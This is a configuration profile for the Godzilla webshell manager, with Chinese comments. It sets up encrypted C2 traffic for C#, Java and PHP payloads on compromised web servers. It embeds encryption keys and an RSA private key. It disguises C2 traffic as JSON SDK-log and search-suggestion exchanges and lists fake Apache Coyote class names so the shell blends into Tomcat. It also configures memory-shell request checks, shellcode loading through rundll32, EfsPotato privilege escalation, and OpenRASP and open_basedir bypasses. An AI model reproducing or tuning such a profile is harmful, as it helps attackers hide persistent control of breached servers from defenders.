#支持的Payload 目前支持 CSharpDynamicPayload,JavaDynamicPayload,PhpDynamicPayload
supportPayload:
- CSharpDynamicPayload
- JavaDynamicPayload
- PhpDynamicPayload
#是否开启静态Payload
enabledStaticPayload: false
#是否开启自定义生成Shell内容
enabledCustomGenerate: false
#自定义生成Shell内容
customGenerate:
  #自定义模板内容
  customGenerateContent: !!binary ''
  #自定义模板后缀
  customGenerateSuffix: php
#静态变量
staticVars:
  xorKey: !!binary 'G\xce,\x87\xee\xae\x27\xda\x17&\x93\x1f\xc3j\x5c\xfd'
  aes256Key: !!binary '\x99\x1fW\x86\xb3y\xbd\xa4\x0a\x0c\xafS\xdd+k\xaf4\x9f\xd4M\x00\xd3~\xf9b\xc7#5v\x13\x8b\x1a'
  RSA_PUBLIC_KEY: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCT+Plqb/gm+AC2WK9lQmkSYrvTjqJtJ2QccY27FfbB9VAVmtwlUxxIKZQjV58u7qx4b0ukOimIZSsfZdQjdzsUDDJTZyBS7IYTZCEY9DFQitvaXvdiAmfw5sfPQahq0jdLdkS2yBaoYOCdRpybP45zXO85F0gXiFmmFOORW3+g2wIDAQAB
  RSA_PRIVATE_KEY: MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGBAJP4+Wpv+Cb4ALZYr2VCaRJiu9OOom0nZBxxjbsV9sH1UBWa3CVTHEgplCNXny7urHhvS6Q6KYhlKx9l1CN3OxQMMlNnIFLshhNkIRj0MVCK29pe92ICZ/Dmx89BqGrSN0t2RLbIFqhg4J1GnJs/jnNc7zkXSBeIWaYU45Fbf6DbAgMBAAECgYAlPIYnTr33sHkdafvZU3j1c3sopcAiD8OVlM3Bwqkx7fWVOj8j9WIslqn8qtQYD1+/fuJeFXTWKf9MC2fy9NIcu21qUnAKR5Ct4kWeib+CxzZTIrHzrbCQtnT5Bw1VZF6SHEivQ+jnvo1vy5z1vHfWVLV2Pf9zpwNQUVGT7AOlQQJBAMV+dAUO0YR6N40ScTO+md/FkktdqxJQT6Zrt/fVLyrhlyTI22wdDB7hTtrO2QoCdYCAHIBk0YsL/32tkWUs9TkCQQC/zuq/em17P56ybnLcO6GD5AODOQClJSDc7SSTTcsOh7YDNMUfH52CDntrqveF3igDHqiM3WlH4+uwFHOcy3qzAkB97tqQdxiG/1/45u+kbT+1f0iAImR5sxh3KG0Q7bG8CEnWvPWeBQ+7iTQ9NnUTeunuXMLP5Hnxzl7Ghy0VdQuRAkA2O2kATrtZ17klNjlfr7SROA0OMzXNe9v420w2Ig7BwvlhmrAJhsTgGvwmiyaFQTUK/MYnXgsAep8PIBk4QgglAkBpPwHLn6bOfBIuAVogj77cE16mSk39ieWGl+2yA/3b2kZ0gP95cRYHvmromJxWy8NtPJWmMQUUS0dsjNaN0YiS
  aes128Key: !!binary '\xd0\x9eX3G\xca\x81\x85k\x98\xc90MB\x05\xf9'
  aes256IV: !!binary 'X_\x12j\xa4\xb6g~U\xc8\xf8\xd05ns\xaa'
#基础配置
basicConfig:
  #均衡Uri 如 /upload /login /download
  uris:
  - /login
  - /run
  #均衡Proxy 如 http://127.0.0.1:8080  socks5://127.0.0.1:1088
  proxys:
  - http://127.0.0.1:8080
  - socks5://127.0.0.1:1088
  #命令执行模式 EASY,KNIFE,NO_MODE
  commandMode: EASY
  #是否使用默认代理 使用后不会再使用均衡Proxy
  useDefaultProxy: true
  #是否使用Http chunk
  useHttpChunk: false
  #Http chunk长度
  httpChunkLen: 102400
  #是否开启均衡Uri 会随机使用其中任意一个uri
  enabledBalanceUris: false
  #是否开启均衡Proxy 会随机使用其中任意一个proxy
  enabledBalanceProxys: false
  #是否开启https客户端证书认证
  enabledHttpsClientCertTrusted: false
  #Base64编码后的pfx证书
  httpsClientCertBae64: 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
  #pfx证书的密码 如果没密码留空
  httpsClientCertPassword: '123456'
  #是否合并返回包的 "Set-Cookie"  csharp与java不会使用session,但php会使用session(php必须开启)
  mergeResponseCookie: true
  #是否合并shell配置页面的请求头
  mergeBasicHeader: true
  #关闭shell后是否清除shell在服务器的缓存
  clearup: false
#核心配置
coreConfig:
  #是否同步请求 同一时间只允许一个http请求  java&csharp强制开启
  requestSync: false
  #是否开启心跳 某些网站的session过期时间比较短 需要开启动态心跳
  enabledHeartbeat: false
  #是否开启服务端输出缓存  一般用在丢包或负载均衡(带有重放校验 开启后将验证报文序号确保数据完整性 如果响应Channel在Header|Cookie而且服务端有Header|Cookie长度限制这将会引起DDOS!!!s
  enabledServerCache: true
  #是否开启错误重试  一般用在负载均衡
  enabledErrRetry: true
  #错误重试最大次数
  errRetryNum: 10
  #心跳包延迟 ms
  heartbeatSleepTime: 30000
  #心跳包抖动 取值范围[0-99](百分比)
  #哥斯拉将按照你指定的心跳包延迟的随机百分比来改变它的每个心跳时间.例如,heartbeatSleepTime=3000,heartbeatJitter=20 将迫使哥斯拉以20%的抖动百分比睡眠3000毫秒.这意味着哥斯拉将在每次心跳后睡眠2400ms到3000ms之间的随机值.
  heartbeatJitter: 55
#请求加密链 目前支持aes128,aes256,base64,hex,raw,rsa,xor
requestEncryptionChain: aes128->hex
#响应加密链 目前支持aes128,aes256,base64,hex,raw,rsa,xor
responseDecryptionChain: xor->base64
#Request配置
request:
  #请求检查 应用于拦截型内存马 支持全匹配与模糊匹配 如
  #GetParameter->name == aaa	指从Get获取参数名为name的参数 并判断它的值是否为aaa
  #Header->name == bbb	指从Header获取参数名为name的参数 并判断它的值是否为bbb
  #Cookie->name == ccc	指从Cookie获取参数名为name的参数 并判断它的值是否为ccc
  #PostParameter->name == ddd	指从Post获取参数名为name的参数 并判断它的值是否为ddd
  #PostParameter->name %= ddd 指从Post获取参数名为name的参数 并判断它的值是否存在ddd
  requestCheck: GetParameter->api == postsdk2
  #Request 查询字符串 支持C2信道
  requestQueryString: ''
  #Request Method
  requestMethod: POST
  #是否开启随机User-Agent
  enabledRandomUserAgent: false
  #请求Body的类型 RAW,FormParameters 取值范围[RAW,FormParameters]
  #	RAW: 二进制数据
  #	FormParameters: 表单数据
  requestBodyEnum: RAW
  #随机User-Agent列表
  randomUserAgentList: [
    ]
  #请求url参数 支持C2信道
  requestUrlParameters: {
    }
  #请求表单参数 支持C2信道
  requestFormParameters: {
    }
  #请求Cookies 支持C2信道
  requestCookies: {
    }
  #请求协议头 支持C2信道
  requestHeaders:
    User-Agent:
    - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
    Content-Type:
    - application/json
  #请求体中间数据 支持C2信道
  requestBody: !!binary '@@@CHANNEL'
  #请求c2通道开头追加数据
  requestChannelStartAppend: !!binary '{"kvs":{"SaveLogResult":[0]},"tags":{"isSucc":true,"sdkVersion":"2.1.4","projectName":"Publish"},"extraData":"'
  #请求c2通道结尾追加数据
  requestChannelEndAppend: !!binary '"}'
#Response配置
response:
  #响应状态码
  responseCode: 200
  #响应协议头 支持C2信道
  responseHeaders:
    Content-Type: application/json
  #响应Cookie 支持C2信道
  responseCookies: {
    }
  #响应体开头追加数据
  responseBodyStartAppend: !!binary ''
  #响应中间数据 仅支持C2信道 (如填写其它值不会输出)
  responseBody: !!binary '@@@CHANNEL'
  #响应体结尾追加数据
  responseBodyEndAppend: !!binary ''
  #响应c2通道开头追加数据
  responseChannelStartAppend: !!binary '{"code":0,"data":{"suggestItems":[],"global":"e1JTQX0pZ'
  #响应c2通道结尾追加数据
  responseChannelEndAppend: !!binary '","exData":{"api_flow01":"0","api_flow02":"0","api_flow03":"1","api_flow04":"0","api_flow05":"0","api_flow06":"0","api_flow07":"0","api_tag":"2","local_cityid":"-1"}}}'
#Payload配置
payloadConfigs:
  AspDynamicPayload: {
    }
  CSharpDynamicPayload: {
    }
  CPayload: {
    }
  JavaDynamicPayload:
    dynamicClassNameSet:
    - org.apache.coyote.introspect.TypeResolutionContext
    - org.apache.coyote.ser.SerializerFactory
    - org.apache.coyote.util.TokenBuffer
    - org.apache.coyote.deser.impl.JDKValueInstantiators
    - org.apache.coyote.introspect.AnnotatedMethod
    - org.apache.coyote.SerializerProvider
    - org.apache.coyote.node.IntNode
    - org.apache.coyote.ser.SerializerCache
    - org.apache.coyote.deser.std.DateDeserializers
    - org.apache.coyote.ser.std.ByteBufferSerializer
    - org.apache.coyote.ser.impl.IndexedStringListSerializer
    - org.apache.coyote.deser.std.EnumMapDeserializer
    - org.apache.coyote.ser.std.JsonValueSerializer
    - org.apache.coyote.exc.InvalidFormatException
    - org.apache.coyote.deser.impl.JavaUtilCollectionsDeserializers
    - org.apache.coyote.jsontype.impl.LaissezFaireSubTypeValidator
    - org.apache.coyote.deser.ContextualDeserializer
    - org.apache.coyote.ser.std.CollectionSerializer
    - org.apache.coyote.jsonFormatVisitors.JsonNullFormatVisitor
    - org.apache.coyote.node.MissingNode
    - org.apache.coyote.deser.impl.ExternalTypeHandler
    - org.apache.coyote.deser.std.StdKeyDeserializer
    - org.apache.coyote.jsonschema.SchemaAware
    - org.apache.coyote.ser.impl.MapEntrySerializer
    - org.apache.coyote.ser.impl.SimpleFilterProvider
    - org.apache.coyote.util.Named
    - org.apache.coyote.jsontype.TypeIdResolver
    - org.apache.coyote.node.POJONode
    - org.apache.coyote.deser.std.JsonLocationInstantiator
    - org.apache.coyote.util.ViewMatcher
    - org.apache.coyote.jsonFormatVisitors.JsonMapFormatVisitor
    - org.apache.coyote.cfg.MapperConfig
    - org.apache.coyote.deser.std.NullifyingDeserializer
    - org.apache.coyote.node.NodeSerialization
    - org.apache.coyote.deser.std.AtomicReferenceDeserializer
    - org.apache.coyote.introspect.CollectorBase
    - org.apache.coyote.ext.CoreXMLDeserializers
    - org.apache.coyote.jsontype.impl.AsExternalTypeDeserializer
    - org.apache.coyote.ser.impl.WritableObjectId
    - org.apache.coyote.util.ISO8601Utils
    - org.apache.coyote.util.NameTransformer
    - org.apache.coyote.introspect.BasicClassIntrospector
    - org.apache.coyote.cfg.PackageVersion
    - org.apache.coyote.deser.DefaultDeserializationContext
    - org.apache.coyote.introspect.AnnotatedField
    - org.apache.coyote.JsonSerializer
    - org.apache.coyote.annotation.JsonTypeIdResolver
    - org.apache.coyote.introspect.AnnotatedFieldCollector
    - org.apache.coyote.type.ClassStack
    - org.apache.coyote.introspect.BeanPropertyDefinition
    - org.apache.coyote.deser.std.ThrowableDeserializer
    - org.apache.coyote.node.BigIntegerNode
    - org.apache.coyote.ser.BeanSerializerModifier
    - org.apache.coyote.ser.std.ObjectArraySerializer
    - org.apache.coyote.deser.SettableAnyProperty
    - org.apache.coyote.jsontype.impl.AsArrayTypeDeserializer
    - org.apache.coyote.util.LRUMap
    - org.apache.coyote.introspect.JacksonAnnotationIntrospector
  PhpDynamicPayload:
    bypassOpenRasp: false
#Plugin配置
pluginConfigs:
  CSharpDynamicPayload:
    ShellcodeLoader:
      spawnto_x86: C:\Windows\SysWOW64\rundll32.exe
      spawnto_x64: C:\Windows\System32\rundll32.exe
    EfsPotato:
      spawnto_x86: C:\Windows\SysWOW64\rundll32.exe
      spawnto_x64: C:\Windows\System32\rundll32.exe
    SuperTerminal:
      sleepTime: 1000
    RealCmd:
      sleepTime: 1000
  CPayload:
    SuperTerminal:
      sleepTime: 1000
    RealCmd:
      sleepTime: 1000
  JavaDynamicPayload:
    ShellcodeLoader:
      spawnto_x86: C:\Windows\SysWOW64\rundll32.exe
      spawnto_x64: C:\Windows\System32\rundll32.exe
    SuperTerminal:
      sleepTime: 1000
    RealCmd:
      sleepTime: 1000
  PhpDynamicPayload:
    ByPassOpenBasedir:
      autoBypass: false
    SuperTerminal:
      sleepTime: 1000
      windowsTempDir: C:/Users/Public/Documents/
    RealCmd:
      sleepTime: 1000
